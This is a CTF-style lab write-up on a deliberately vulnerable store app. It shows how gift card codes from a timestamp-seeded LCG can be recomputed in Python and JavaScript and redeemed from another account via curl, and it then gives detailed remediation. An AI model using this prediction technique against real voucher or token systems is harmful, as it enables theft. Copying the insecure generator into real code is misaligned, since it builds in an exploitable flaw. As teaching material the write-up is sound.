---
author: kOaDT
authorGithubUrl: https://github.com/kOaDT
authorGithubAvatar: https://avatars.githubusercontent.com/u/17499022?v=4
pubDatetime: 2026-04-22T10:00:01Z
title: "Insecure Randomness: recovering a gift card code from its timestamp"
slug: insecure-randomness-gift-card
draft: false
tags:
  - writeup
  - insecure-randomness
  - cryptography
  - prng
  - lcg
  - ctf
description: OopsSec Store derives gift card codes from a linear congruential generator seeded with the card's creation timestamp. The timestamp is exposed to the buyer with millisecond precision, which is all you need to reproduce the code and redeem the card from a different account.
---

The OopsSec Store sells digital gift cards: pick a denomination, type a recipient, get a `XXXX-XXXX-XXXX` code by email. That code is everything. Whoever has it can spend it.

Which is a problem, because the code isn't random. It comes out of a classic linear congruential generator (LCG) seeded with the card's `createdAt` timestamp in milliseconds, and the app happily renders that timestamp to the millisecond on both `/profile/gift-cards` and `GET /api/gift-cards`. Seed in the response, generator in the repo, the rest is arithmetic.

## Table of contents

## Lab setup

From an empty directory:

```bash
npx create-oss-store oss-store
cd oss-store
npm start
```

Or with Docker (no Node.js required):

```bash
docker run -p 3000:3000 leogra/oss-oopssec-store
```

The app runs at `http://localhost:3000`. Two demo accounts are relevant:

- `alice@example.com` / `iloveduck` — buyer of the seeded $500 gift card
- `bob@example.com` / `qwerty` — a different authenticated user; the attacker in this scenario

## Target identification

Log in as Alice and visit `/profile/gift-cards`. You will see one card pre-seeded:

- Recipient: `forgotten-friend@oopssec.store`
- Amount: $500.00
- Status: **Pending**
- Sent on: `Jan 15, 2025, 10:42:33 AM.456` (or similar, in your locale)

That trailing `.456` isn't a formatting quirk. It's the milliseconds, and it's the seed.

![/profile/gift-cards](../../assets/images/insecure-randomness-gift-card/history.png)

Click **Resend email** on the card. The UI responds with _Email service temporarily unavailable_. That endpoint always fails. This is by design: the server has gone out of its way to _not_ give you the code back, even though you are the legitimate buyer. You can confirm the same response from the API:

```bash
curl -X POST http://localhost:3000/api/gift-cards/resend \
  -H "Content-Type: application/json" \
  -H "Cookie: authToken=<alice-authToken>" \
  -d '{"id":"gc-seeded-001"}'
```

```json
{ "error": "Email service temporarily unavailable" }
```

Same story for `GET /api/gift-cards` — it returns the card metadata but omits the `code` field. The `createdAt` is right there though:

```json
{
  "id": "gc-seeded-001",
  "amount": 500,
  "recipientEmail": "forgotten-friend@oopssec.store",
  "status": "PENDING",
  "createdAt": "2025-01-15T10:42:33.456Z"
}
```

## Understanding the vulnerability

### How the code is generated

The generator lives in `lib/gift-card.ts`:

```typescript
const ALPHABET = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"; // 32 chars

function nextState(state: number): number {
  return (Math.imul(state, 1103515245) + 12345) & 0x7fffffff;
}

export function generateGiftCardCode(seed: number): string {
  let state = seed & 0x7fffffff;
  const chars: string[] = [];
  for (let i = 0; i < 12; i++) {
    state = nextState(state);
    const index = (state >>> 16) % ALPHABET.length;
    chars.push(ALPHABET[index]);
  }
  // returns XXXX-XXXX-XXXX
  ...
}
```

Three things should set off alarms:

- **Hard-coded magic numbers.** `1103515245` and `12345` aren't random choices — they are the exact constants used by the C standard library's `rand()` function (as shipped in glibc, BSD, and the Numerical Recipes textbook). Anyone familiar with classical PRNGs recognises them on sight, and the algorithm is documented everywhere (see [this Stack Overflow thread](https://stackoverflow.com/questions/8569113/why-1103515245-is-used-in-rand) on the origin of the multiplier).
- **No entropy anywhere.** Same seed in, same code out. A proper generator reads from the operating system's entropy pool (`crypto.randomBytes` in Node, `/dev/urandom` on Linux) and never repeats.
- **The seed is attacker-observable.** The only input is a wall-clock timestamp in milliseconds, and the app hands that timestamp back to the client on `/profile/gift-cards` and in the API response.

### Where the seed lives in the response

`POST /api/gift-cards` (the purchase endpoint) sets `createdAt = new Date()` and calls `generateGiftCardCode(createdAt.getTime())`. `createdAt` is then stored on the row, returned in `GET /api/gift-cards`, and displayed on `/profile/gift-cards`. Any single one of those pins down the exact millisecond.

### Why `Math.imul`?

Multiplying a 31-bit state by `1103515245` can overflow JavaScript's 53-bit safe integer range. `Math.imul` performs exact 32-bit signed multiplication, which matches how the LCG is defined. When you port the exploit to Python, you get the same precision for free because Python integers are arbitrary-precision.

## Exploitation

### Step 1: Read the target's `createdAt`

Log in as Alice (the buyer of the seeded card) and grab the timestamp. Either visit `/profile/gift-cards` and read it off the card, or call the API:

```bash
curl -s -c cookies.txt -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"alice@example.com","password":"iloveduck"}' >/dev/null

curl -s -b cookies.txt http://localhost:3000/api/gift-cards | python3 -m json.tool
```

Note the `createdAt` of the card addressed to `forgotten-friend@oopssec.store`. For the seeded row it is `2025-01-15T10:42:33.456Z`.

### Step 2: Re-implement the LCG and derive the code

```python
#!/usr/bin/env python3
"""Reproduce the OopsSec Store gift card code from a createdAt timestamp."""

import datetime

ALPHABET = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"
MULTIPLIER = 1103515245
INCREMENT = 12345
MASK = 0x7fffffff


def gift_card_code(seed_ms: int) -> str:
    state = seed_ms & MASK
    chars = []
    for _ in range(12):
        state = (state * MULTIPLIER + INCREMENT) & MASK
        chars.append(ALPHABET[(state >> 16) % len(ALPHABET)])
    return f"{''.join(chars[0:4])}-{''.join(chars[4:8])}-{''.join(chars[8:12])}"


created_at = datetime.datetime(
    2025, 1, 15, 10, 42, 33, 456000, tzinfo=datetime.timezone.utc
)
seed_ms = int(created_at.timestamp() * 1000)
print(gift_card_code(seed_ms))
```

```text
JQSP-2G6N-G2ZY
```

You can sanity-check the same logic in a browser console:

```javascript
function code(seed) {
  const ALPHABET = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  let s = seed & 0x7fffffff;
  let out = "";
  for (let i = 0; i < 12; i++) {
    s = (Math.imul(s, 1103515245) + 12345) & 0x7fffffff;
    out += ALPHABET[(s >>> 16) % ALPHABET.length];
    if (i === 3 || i === 7) out += "-";
  }
  return out;
}
code(new Date("2025-01-15T10:42:33.456Z").getTime());
// "JQSP-2G6N-G2ZY"
```

### Step 3: Redeem from a different account

The recipient on the card is `forgotten-friend@oopssec.store`, a throwaway address nobody owns. Handy, because redemption doesn't actually check who's redeeming. Log in as Bob, paste the derived code at `/checkout/redeem`, or hit the API directly:

```bash
curl -s -c bob.txt -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"bob@example.com","password":"qwerty"}' >/dev/null

curl -s -b bob.txt -X POST http://localhost:3000/api/gift-cards/redeem \
  -H "Content-Type: application/json" \
  -d '{"code":"JQSP-2G6N-G2ZY"}' | python3 -m json.tool
```

```json
{
  "success": true,
  "amount": 500,
  "balance": 500,
  "flag": "OSS{1ns3cur3_r4nd0mn3ss_g1ft_c4rd}"
}
```

$500 of store credit now belongs to Bob, and the flag is in the response.

![Flag](../../assets/images/insecure-randomness-gift-card/flag.png)

## Vulnerable code analysis

The full generator in `lib/gift-card.ts`:

```typescript
function nextState(state: number): number {
  return (Math.imul(state, 1103515245) + 12345) & 0x7fffffff;
}

export function generateGiftCardCode(seed: number): string {
  let state = seed & 0x7fffffff;
  const chars: string[] = [];
  for (let i = 0; i < GROUP_COUNT * GROUP_SIZE; i++) {
    state = nextState(state);
    const index = (state >>> 16) % ALPHABET.length;
    chars.push(ALPHABET[index]);
  }
  const groups: string[] = [];
  for (let g = 0; g < GROUP_COUNT; g++) {
    groups.push(chars.slice(g * GROUP_SIZE, (g + 1) * GROUP_SIZE).join(""));
  }
  return groups.join("-");
}
```

And the purchase path in `app/api/gift-cards/route.ts` — the seed is `createdAt.getTime()`:

```typescript
const createdAt = new Date();
const code = generateGiftCardCode(createdAt.getTime());

const giftCard = await prisma.giftCard.create({
  data: {
    code,
    amount,
    recipientEmail,
    message,
    createdAt,
    buyerId: user.id,
  },
});
```

Once you observe `createdAt` for any card, you can replay `generateGiftCardCode(createdAt.getTime())` offline and obtain the code.

## Remediation

### Do not use a PRNG for secrets

Replace the LCG with a draw from the OS entropy pool:

```typescript
import { randomBytes } from "node:crypto";

const ALPHABET = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";

export function generateGiftCardCode(): string {
  const bytes = randomBytes(12);
  const chars: string[] = [];
  for (let i = 0; i < 12; i++) {
    chars.push(ALPHABET[bytes[i] % ALPHABET.length]);
  }
  return `${chars.slice(0, 4).join("")}-${chars
    .slice(4, 8)
    .join("")}-${chars.slice(8, 12).join("")}`;
}
```

The function no longer accepts a seed — there is nothing for the attacker to leak. At 12 characters from a 32-character alphabet, the code carries ~60 bits of entropy, which is well beyond any realistic enumeration attack.

> **`Math.random()` is not the fix either.** The natural reflex after reading this is "fine, I'll swap the LCG for `Math.random()`". Don't. V8 uses xorshift128+ under the hood, which is _not_ cryptographically secure: given enough consecutive outputs from the same isolate, the internal state can be recovered and all past/future outputs predicted. The [v8.dev blog post on `Math.random`](https://v8.dev/blog/math-random) walks through the algorithm and its limits. The reason we used an explicit LCG in this challenge is pedagogical — it makes the exploit a ten-line Python loop — but "custom PRNG" and "`Math.random()`" are two flavours of the same CWE-338 mistake. The only correct primitive for anything that functions as a secret is `crypto.randomBytes()` / `crypto.getRandomValues()`.

### Stop leaking creation timestamps with millisecond precision

The UI and API do not need ms-level timestamps on a gift card. Truncate to the day, or drop the field from the public response entirely. Even if the underlying PRNG were strong, returning internal state with extra precision is an unforced error.

### Store the code hashed, not in plaintext

Treat the code like a password. Hash it at creation (SHA-256 is fine for high-entropy secrets), store only the hash, and compare hashes at redemption. A database leak then costs you zero dollars in refunds.

### Constant-time comparison and atomic redemption

Compare codes with `crypto.timingSafeEqual`, and make the redeem operation atomic (`UPDATE ... WHERE status = 'PENDING' AND codeHash = ...`). The current codebase already does this in the redeem handler — worth keeping when you rewrite the generator.

## Takeaways

- `Math.random` and LCGs don't belong anywhere near values that act like secrets. Gift card codes, reset links, invite tokens, any value that unlocks something, it all needs `crypto.randomBytes`.
- A good generator doesn't help if you leak the seed. Timestamps and counters are not secret.
- Closing the delivery channel (the "resend always fails" move) doesn't fix anything when the generator itself is broken. The attacker doesn't need delivery, they can rebuild the code.
- `rand()` constants next to money or auth is a finding on sight.

## References

- [CWE-330: Use of Insufficiently Random Values](https://cwe.mitre.org/data/definitions/330.html)
- [CWE-338: Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)](https://cwe.mitre.org/data/definitions/338.html)
- [OWASP — Insecure Randomness](https://owasp.org/www-community/vulnerabilities/Insecure_Randomness)
- [Node.js `crypto.randomBytes` docs](https://nodejs.org/api/crypto.html#cryptorandombytessize-callback)
- [Linear congruential generator (Wikipedia)](https://en.wikipedia.org/wiki/Linear_congruential_generator)
